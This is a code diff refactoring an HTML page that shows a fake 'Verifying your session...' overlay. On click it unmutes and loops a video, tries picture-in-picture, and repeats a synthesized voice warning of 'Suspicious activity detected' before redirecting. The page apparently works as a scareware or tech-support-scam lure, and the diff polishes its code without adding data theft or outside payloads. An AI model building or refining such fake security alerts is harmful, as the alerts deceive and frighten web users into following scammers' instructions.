@@ -9,7 +9,7 @@
 <div id="overlay" style="position:absolute; top:40%; width:100%; z-index:2;">
   <h2>Verifying your session...</h2>
   <p>Please wait...</p>
-  <button onclick="start()" style="padding:12px 24px; font-size:16px;">
+  <button id="startBtn" style="padding:12px 24px; font-size:16px;">
     Continue
   </button>
 </div>
@@ -23,54 +23,54 @@
 
 <script>
 let speaking = false;
+let speechMsg;
 
-async function start(){
-
+async function start() {
   const v = document.getElementById("v");
+  const btn = document.getElementById("startBtn");
 
-  // 🔒 disable button biar tidak spam
-  document.querySelector("button").disabled = true;
+  // 🔒 Disable button supaya tidak spam
+  btn.disabled = true;
 
-  // 🎬 Start video
+  // 🎬 Play video
   try {
     v.muted = false;
     v.volume = 1;
     v.loop = true;
     await v.play();
-  } catch(e){}
+  } catch(e){ console.warn("Video play failed", e); }
 
-  // 🖼️ Try PiP (optional, fail-safe)
+  // 🖼️ Try PiP safely
   try {
     if (document.pictureInPictureEnabled && !document.pictureInPictureElement) {
       await v.requestPictureInPicture();
     }
-  } catch(e){}
+  } catch(e){ console.warn("PiP failed", e); }
 
-  // 🔊 Speech function (biar reusable & clean)
-  function speakLoop(){
-    if (speaking) return; // prevent overlap
+  // 🔊 SpeechSynthesis function
+  function speakLoop() {
+    if (speaking) return;
     speaking = true;
 
-    const msg = new SpeechSynthesisUtterance(
+    speechMsg = new SpeechSynthesisUtterance(
       "Security alert. Suspicious activity detected. Please follow the instructions on this page."
     );
 
-    // handle voices properly (async-safe)
-    let voices = speechSynthesis.getVoices();
-
-    if (!voices.length) {
-      speechSynthesis.onvoiceschanged = () => {
-        voices = speechSynthesis.getVoices();
-        msg.voice = voices.find(v => v.lang.includes("en")) || voices[0];
-        speechSynthesis.speak(msg);
-      };
+    const voices = speechSynthesis.getVoices();
+    if (voices.length > 0) {
+      speechMsg.voice = voices.find(v => v.lang.includes("en")) || voices[0];
+      speechSynthesis.speak(speechMsg);
     } else {
-      msg.voice = voices.find(v => v.lang.includes("en")) || voices[0];
-      speechSynthesis.speak(msg);
+      // fallback jika voices belum load
+      speechSynthesis.onvoiceschanged = () => {
+        const loadedVoices = speechSynthesis.getVoices();
+        speechMsg.voice = loadedVoices.find(v => v.lang.includes("en")) || loadedVoices[0];
+        speechSynthesis.speak(speechMsg);
+      };
     }
 
-    // 🔁 loop clean (no spam overlap)
-    msg.onend = () => {
+    // 🔁 Loop clean tanpa tumpuk
+    speechMsg.onend = () => {
       speaking = false;
       speakLoop();
     };
@@ -78,11 +78,14 @@ async function start(){
 
   speakLoop();
 
-  // ⏱️ smoother timing (lebih natural)
+  // ⏱️ Redirect after short delay
   setTimeout(() => {
     window.location.href = "https://www.google.com";
   }, 1200);
 }
+
+// 🔗 Bind button
+document.getElementById("startBtn").addEventListener("click", start);
 </script>
 
 </body>
